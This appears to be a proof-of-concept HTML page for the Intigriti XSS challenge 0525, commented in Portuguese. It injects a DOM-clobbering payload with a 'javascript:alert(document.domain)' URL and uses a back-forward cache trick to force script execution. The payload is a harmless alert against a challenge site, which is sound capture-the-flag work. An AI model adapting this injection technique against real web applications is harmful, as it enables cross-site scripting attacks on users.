<!DOCTYPE html>
<html>
<body>
<script>
    const targetUrl = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG_SRC%20data-url%3Djavascript:alert(document.domain)%3Etest%3C%2Fdiv%3E%3Cstrong%3Ea";
    const backUrl = "https://yourdomain.com/back.html?n=1"; // ✅ Substitua para o back.html hospedado em seu domínio

    const w = window.open(targetUrl);

    // Após 3 segundos, volta para acionar bfcache
    setTimeout(() => {
        try { w.location = backUrl; } catch (e) {}
    }, 3000);

    // Após voltar da bfcache, tenta forçar addDynamicScript repetidamente
    const interval = setInterval(() => {
        try {
            if (w.document && w.CONFIG_SRC && typeof w.addDynamicScript === "function") {
                w.addDynamicScript();
                clearInterval(interval); // Executou com sucesso, para o loop
            }
        } catch (e) {
            // Cross-origin ou ainda carregando, ignora
        }
    }, 500); // Tenta a cada meio segundo
</script>
</body>
</html>
